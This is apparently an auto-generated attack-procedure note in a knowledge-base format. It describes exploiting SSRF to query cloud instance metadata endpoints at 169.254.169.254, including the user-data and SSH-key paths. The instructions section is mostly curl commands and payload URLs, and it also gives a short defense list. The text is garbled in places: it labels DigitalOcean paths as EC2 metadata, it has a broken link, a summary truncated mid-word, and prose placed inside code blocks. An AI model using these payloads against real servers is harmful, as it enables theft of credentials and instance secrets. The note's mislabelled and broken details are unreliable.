---
id: 45d6e761-dffd-4f60-8045-7b99c434f8d7
name: SSRF for Cloud Instances
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.459695+00:00'
updated_at: '2023-04-10T20:24:07.322365+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Cloud Service Discovery|T1526 - Cloud Service Discovery]]'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SSRF URL for Cloud Instances]]'
- '[[SSRF URL for Digital Ocean]]'
commands:
- '[[Accessing Metadata]]'
- '[[Get hostname information]]'
- '[[Get IPv6 address]]'
- '[[Get metadata information]]'
- '[[Get metadata information in JSON format]]'
- '[[Get metadata information in JSON format using jq]]'
- '[[Get metadata information using curl]]'
- '[[Get region information]]'
- '[[Get user data information]]'
- '[[Retrieving Droplet Metadata]]'
- '[[Retrieving Metadata from within a Droplet]]'
- '[[Retrieving SSH Keys]]'
- '[[Retrieving User Data]]'
---

# SSRF for Cloud Instances

## Summary

This procedure involves the exploitation of Server-Side Request Forgery (SSRF) vulnerabilities in order to access sensitive information from cloud instances. By sending crafted requests to the server, attackers can trick the server into accessing sensitive resources and returning the results. In th

## Description

# Description

This procedure involves the exploitation of Server-Side Request Forgery (SSRF) vulnerabilities in order to access sensitive information from cloud instances. By sending crafted requests to the server, attackers can trick the server into accessing sensitive resources and returning the results. In this case, we are focusing on SSRF URLs for DigitalOcean and AWS EC2 instances. This technique can be used for reconnaissance purposes, to gather information about the cloud infrastructure, and to potentially gain access to sensitive data.

 

## Requirements

1. Access to the vulnerable server

1. Knowledge of SSRF vulnerabilities

1. Access to tools for crafting requests

 

## Defense

1. Implement input validation and sanitization to prevent SSRF vulnerabilities

1. Limit network access to only necessary services and ports

1. Monitor network traffic for suspicious activity

 

## Objectives

1. Gather information about the cloud infrastructure

1. Access sensitive data from cloud instances

 

# Instructions

1. To access DigitalOcean metadata, use the following command:

 



**Code**: [[https://developers.digitalocean.com/documentation/]]



> curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/



**Command** ([[Accessing Metadata]]):

```bash
To access metadata, send an HTTP request to the metadata service with the appropriate path for the data you want to retrieve.
```





**Command** ([[Retrieving Droplet Metadata]]):

```bash
To retrieve metadata about a Droplet, send an HTTP request to the metadata service with the path /metadata/v1.json.
```





**Command** ([[Retrieving User Data]]):

```bash
To retrieve user data, send an HTTP request to the metadata service with the path /metadata/v1/user-data.
```





**Command** ([[Retrieving SSH Keys]]):

```bash
To retrieve SSH keys, send an HTTP request to the metadata service with the path /metadata/v1/ssh-keys.
```





**Command** ([[Retrieving Metadata from within a Droplet]]):

```bash
To retrieve metadata from within a Droplet, send an HTTP request to 169.254.169.254 with the appropriate path for the data you want to retrieve.
```



2. To retrieve metadata of an EC2 instance, use the following command:

 



**Code**: [[curl http://169.254.169.254/metadata/v1/id
http://]]



> This command retrieves metadata of an EC2 instance such as its ID, user data, hostname, region, and IPv6 address. The command can be run from within the EC2 instance as it accesses the instance metadata service available at a pre-defined IP address. The 'jq' command is used to format the output of the JSON response. The 'curl' command is used to make HTTP requests to the metadata service. You can also retrieve all the metadata in one request by using the command 'curl http://169.254.169.254/metadata/v1.json | jq'.



**Command** ([[Get metadata information]]):

```bash
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```





**Command** ([[Get metadata information in JSON format]]):

```bash
curl http://169.254.169.254/metadata/v1.json
```





**Command** ([[Get metadata information using curl]]):

```bash
curl http://169.254.169.254/metadata/v1/
```





**Command** ([[Get user data information]]):

```bash
curl http://169.254.169.254/metadata/v1/user-data
```





**Command** ([[Get hostname information]]):

```bash
curl http://169.254.169.254/metadata/v1/hostname
```





**Command** ([[Get region information]]):

```bash
curl http://169.254.169.254/metadata/v1/region
```





**Command** ([[Get IPv6 address]]):

```bash
curl http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```





**Command** ([[Get metadata information in JSON format using jq]]):

```bash
curl http://169.254.169.254/metadata/v1.json | jq
```



## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Cloud Service Discovery|T1526 - Cloud Service Discovery]]

## Commands Used

- [[Accessing Metadata]]
- [[Get hostname information]]
- [[Get IPv6 address]]
- [[Get metadata information]]
- [[Get metadata information in JSON format]]
- [[Get metadata information in JSON format using jq]]
- [[Get metadata information using curl]]
- [[Get region information]]
- [[Get user data information]]
- [[Retrieving Droplet Metadata]]
- [[Retrieving Metadata from within a Droplet]]
- [[Retrieving SSH Keys]]
- [[Retrieving User Data]]

## Tags

- [[Server-Side Request Forgery]]
- [[SSRF URL for Cloud Instances]]
- [[SSRF URL for Digital Ocean]]


